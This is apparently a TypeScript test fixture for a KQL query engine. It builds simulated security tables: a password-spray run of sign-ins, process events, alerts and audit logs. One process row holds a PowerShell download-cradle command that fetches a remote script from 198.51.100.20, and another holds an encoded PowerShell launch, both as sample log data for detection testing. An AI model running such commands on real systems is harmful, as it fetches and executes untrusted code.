import { runKql } from "./index";
import type { KqlColumn, KqlEnv, KqlResult, KqlRow, KqlTable, KqlType } from "./types";

export const NOW = new Date("2026-11-07T12:00:00Z");

const minutesAgo = (m: number) => new Date(NOW.getTime() - m * 60_000);

function table(name: string, spec: Record<string, KqlType>, rows: KqlRow[]): KqlTable {
  const columns: KqlColumn[] = Object.entries(spec).map(([n, type]) => ({ name: n, type }));
  return { name, columns, rows };
}

const SPRAY_IP = "203.0.113.50";

function signin(min: number, user: string, ip: string, result: string, risk: string, extra: KqlRow = {}): KqlRow {
  return {
    TimeGenerated: minutesAgo(min), UserPrincipalName: user, IPAddress: ip, ResultType: result,
    ResultDescription: result === "0" ? "" : "Invalid username or password", AppDisplayName: "Azure Portal",
    RiskLevelDuringSignIn: risk, Location: "US",
    LocationDetails: { city: "Redmond", state: "Washington", geoCoordinates: { latitude: 47.6 } },
    DeviceDetail: { operatingSystem: "Windows 11", browser: "Edge 118" }, DurationMs: 120 + min, ...extra,
  };
}

const signins: KqlRow[] = [
  signin(5, "alice@nexacorp.example", SPRAY_IP, "50126", "none"),
  signin(6, "bob@nexacorp.example", SPRAY_IP, "50126", "none"),
  signin(7, "carol@nexacorp.example", SPRAY_IP, "50126", "low"),
  signin(8, "dan@nexacorp.example", SPRAY_IP, "50126", "none"),
  signin(9, "erin@nexacorp.example", SPRAY_IP, "50126", "none"),
  signin(10, "frank@nexacorp.example", SPRAY_IP, "50126", "none"),
  signin(11, "alice@nexacorp.example", SPRAY_IP, "50126", "none"),
  signin(12, "alice@nexacorp.example", "198.51.100.7", "0", "high"),
  signin(15, "grace@nexacorp.example", "198.51.100.8", "50053", "none"),
  signin(20, "grace@nexacorp.example", "198.51.100.8", "0", "none", { DurationMs: null, LocationDetails: null }),
  signin(150, "heidi@nexacorp.example", SPRAY_IP, "50126", "none"),
  signin(200, "alice@nexacorp.example", "198.51.100.7", "0", "high"),
];

const processes: KqlRow[] = [
  { TimeGenerated: minutesAgo(30), DeviceName: "WKS-014", AccountName: "alice", FileName: "powershell.exe", ProcessCommandLine: "powershell.exe -enc SQBFAFgA", InitiatingProcessFileName: "winword.exe", ProcessId: 4312 },
  { TimeGenerated: minutesAgo(29), DeviceName: "WKS-014", AccountName: "alice", FileName: "powershell.exe", ProcessCommandLine: "powershell -nop -c (New-Object Net.WebClient).DownloadString('http://198.51.100.20/a.ps1')", InitiatingProcessFileName: "powershell.exe", ProcessId: 4388 },
  { TimeGenerated: minutesAgo(28), DeviceName: "WKS-022", AccountName: "bob", FileName: "cmd.exe", ProcessCommandLine: "cmd.exe /c whoami", InitiatingProcessFileName: "explorer.exe", ProcessId: 1200 },
  { TimeGenerated: minutesAgo(27), DeviceName: "SRV-DC01", AccountName: "svc_backup", FileName: "notepad.exe", ProcessCommandLine: "notepad.exe C:\\Users\\Public\\encoded.txt", InitiatingProcessFileName: "explorer.exe", ProcessId: null },
];

const alerts: KqlRow[] = [
  { TimeGenerated: minutesAgo(4), AlertName: "Password spray", AlertSeverity: "High", CompromisedEntity: "alice@nexacorp.example", Entities: '[{"Type":"ip","Address":"203.0.113.50"},{"Type":"account","Name":"alice"}]', Tactics: "CredentialAccess", SystemAlertId: "a1", ProductName: "Azure Sentinel" },
  { TimeGenerated: minutesAgo(25), AlertName: "Suspicious PowerShell", AlertSeverity: "Medium", CompromisedEntity: "WKS-014", Entities: '[{"Type":"host","HostName":"WKS-014"}]', Tactics: "Execution,DefenseEvasion", SystemAlertId: "a2", ProductName: "Microsoft Defender for Endpoint" },
  { TimeGenerated: minutesAgo(26), AlertName: "Suspicious PowerShell", AlertSeverity: "Low", CompromisedEntity: "WKS-022", Entities: "not json", Tactics: "Execution", SystemAlertId: "a3", ProductName: "Microsoft Defender for Endpoint" },
];

const audit: KqlRow[] = [
  { TimeGenerated: minutesAgo(3), OperationName: "Add member to role", Result: "success", InitiatedBy: { user: { userPrincipalName: "alice@nexacorp.example", ipAddress: "198.51.100.7" } }, TargetResources: [{ displayName: "Global Administrator", id: "t1" }, { displayName: "backup-admin", id: "t2" }] },
  { TimeGenerated: minutesAgo(13), OperationName: "Update user", Result: "success", InitiatedBy: { user: { userPrincipalName: "bob@nexacorp.example" } }, TargetResources: [{ displayName: "carol" }] },
  { TimeGenerated: minutesAgo(14), OperationName: "Consent to application", Result: "failure", InitiatedBy: { app: { displayName: "Graph Sync" } }, TargetResources: [] },
];

export function fixtureEnv(overrides: Partial<KqlEnv> = {}): KqlEnv {
  return {
    now: NOW,
    tables: {
      SigninLogs: table("SigninLogs", {
        TimeGenerated: "datetime", UserPrincipalName: "string", IPAddress: "string", ResultType: "string", ResultDescription: "string",
        AppDisplayName: "string", RiskLevelDuringSignIn: "string", Location: "string", LocationDetails: "dynamic", DeviceDetail: "dynamic", DurationMs: "long",
      }, signins),
      DeviceProcessEvents: table("DeviceProcessEvents", {
        TimeGenerated: "datetime", DeviceName: "string", AccountName: "string", FileName: "string", ProcessCommandLine: "string",
        InitiatingProcessFileName: "string", ProcessId: "long",
      }, processes),
      SecurityAlert: table("SecurityAlert", {
        TimeGenerated: "datetime", AlertName: "string", AlertSeverity: "string", CompromisedEntity: "string", Entities: "string",
        Tactics: "string", SystemAlertId: "string", ProductName: "string",
      }, alerts),
      AuditLogs: table("AuditLogs", {
        TimeGenerated: "datetime", OperationName: "string", Result: "string", InitiatedBy: "dynamic", TargetResources: "dynamic",
      }, audit),
    },
    ...overrides,
  };
}

export type Ok = Extract<KqlResult, { ok: true }>;

export function ok(query: string, env: KqlEnv = fixtureEnv()): Ok {
  const r = runKql(query, env);
  if (!r.ok) throw new Error(`Expected success for:\n${query}\nGot: ${r.error.message} (${r.error.line}:${r.error.column})`);
  return r;
}

export function fail(query: string, env: KqlEnv = fixtureEnv()) {
  const r = runKql(query, env);
  if (r.ok) throw new Error(`Expected a failure for:\n${query}`);
  return r.error;
}

/** Values of one column. */
export function col(result: Ok, name: string): unknown[] {
  return result.rows.map((r) => r[name]);
}

export function names(result: Ok): string[] {
  return result.columns.map((c) => c.name);
}

/** First cell of the first row. */
export function cell(query: string, env?: KqlEnv): unknown {
  const r = ok(query, env);
  return r.rows[0][r.columns[0].name];
}

/** The value of one scalar expression. */
export const scalar = (expr: string, env?: KqlEnv): unknown => cell(`print x = ${expr}`, env);
